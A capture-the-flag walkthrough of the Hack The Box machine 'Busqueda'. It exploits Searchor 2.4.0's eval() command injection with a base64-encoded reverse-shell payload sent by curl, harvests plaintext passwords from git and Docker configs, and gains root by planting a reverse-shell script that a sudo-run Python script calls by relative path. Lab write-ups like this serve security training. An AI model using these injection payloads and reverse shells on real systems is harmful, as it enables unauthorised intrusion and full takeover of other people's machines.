# HTB - Busqueda

#### Ip: 10.10.11.208
#### Name: Busqueda
#### Rating: Easy

----------------------------------------------------------------------

Busqueda.png


### Enumeration

As always, lets kick things off by scanning all TCP ports with Nmap. Here I'll also use the `-sC` and `-sV` flags to use basic Nmap scripts and to enumerate versions too.

```text
┌──(ryan㉿kali)-[~/HTB/Busqueda]
└─$ sudo nmap -p- --min-rate 10000 10.10.11.208 -sC -sV 
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-01 10:06 CST
Nmap scan report for 10.10.11.208
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.54 seconds
```

We can see the site is attempting to redirect to http://searcher.htb/ so lets add that to our `/etc/hosts` file.


Navigating to the site on port 80 we find a page with search functionality:

busqueda_site.png

At the bottom of the page we see it is running Flask as well as Searchor 2.4.0:

busqueda_version.png

Looking for exploits for searcher 2.4.0 we find this GitHub feauturing a bash arbitrary code injection exploit:

https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection

Per the GitHub ReadMe we see it is specifically exploiting the function call `eval()` in which it is able to execute system commands:

```python
@click.argument("query")
def search(engine, query, open, copy):
    try:
        url = eval( # <<< See here 
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
        click.echo(url)
        searchor.history.update(engine, query, url)
        if open:
            click.echo("opening browser...")
	  ...
```

The script injects:
```bash
rev_shell_b64=$(echo -ne "bash  -c 'bash -i >& /dev/tcp/$2/${port} 0>&1'" | base64)
evil_cmd="',__import__('os').system('echo ${rev_shell_b64}|base64 -d|bash -i'))
```

Into the function via a POST request using CURL:
```bash
curl -s -X POST $1/search -d "engine=Google&query=${evil_cmd}" 1> /dev/null
```

### Exploitation

We can exploit this vulnerability with the exploit script with no changes needed to the code:

busqueda_shell.png

getting a shell back as user svc.

We are now able to grab the user.txt flag:

busqueda_user.png

### Privilege Escalation

Looking more closely at the svc home folder we find a .gitconfig file:

```
svc@busqueda:~$ cat .gitconfig
cat .gitconfig
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
```

Lets hang onto this info and keep enumerating.

After loading up and running linpeas.sh to help enumerate a privilege escalation vector, we notice there is a gitea vhost running that was missed during enumeration. Lets add that to `/etc/hosts` and check it out:

```
10.10.11.208    searcher.htb gitea.searcher.htb
```

Heading to the gitea site we find a sign-in button:

busqueda_gitea.png

This seems like progress, but we still don't have a password for cody.

Going back to my shell for further enumeration I find a .git file in `/var/www/app` that has a config file containing cody's password:

busqueda_password.png

cody:jh1usoih2bkjaspwe92

Armed with this password lets see if we can use it to run `sudo -l` to check if we can run anything with elevated permissions:

```text
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

We are unable to read this script:
```text
svc@busqueda:/var/www/app/.git$ cat /opt/scripts/system-checkup.py
cat: /opt/scripts/system-checkup.py: Permission denied
```
But trying to run it to read a file normally prohibted to lower level users gets us this error:
```text
svc@busqueda: sudo /usr/bin/python3 /opt/scripts/system-checkup.py /etc/shadow

Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

We can view the docker containers:
```text
svc@busqueda: sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps  
CONTAINER ID   IMAGE                COMMAND                  CREATED         STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   13 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   13 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

Lets inspect the gitea container. To do that we'll also need to declare the format:
```
Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
```
I had to reference the docker docs (ha) for this. I am super bad with Docker and it is definitely something I need to learn more about:

busqueda_docker_docs.png

```text
svc@busqueda: sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' gitea

--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```

Nice! Looks like we've discovered another credential: yuiu1hoiu4i5ho1uh

We can use this to succesfully log into the gitea site as the administrator:

busqueda_login.png

Taking a look at the sytem-checkup.py file we see it also is executing the full-checkup.sh file in `/opt/scripts`

```python
    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
```
Because this doesn't contain the full path for full-checkup.sh, we may be able to create our own malicious file calle full-checkup.sh, and execute it using our sudo permissions.

Lets create a file called full-checkup.sh containing a bash reverse shell:
```bash
#! /bin/bash
bash -i >& /dev/tcp/10.10.14.60/4444 0>&1
```

We can make it executable with:
```bash
chmod +x full-checkup.sh
```

And finally we can set up a nc listener, and execute it using our sudo permissions:

```text
sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
```

This catches us a shell back as root and we can grab the final flag:

busqueda_root.png

Thanks for folllowing along!

-Ryan





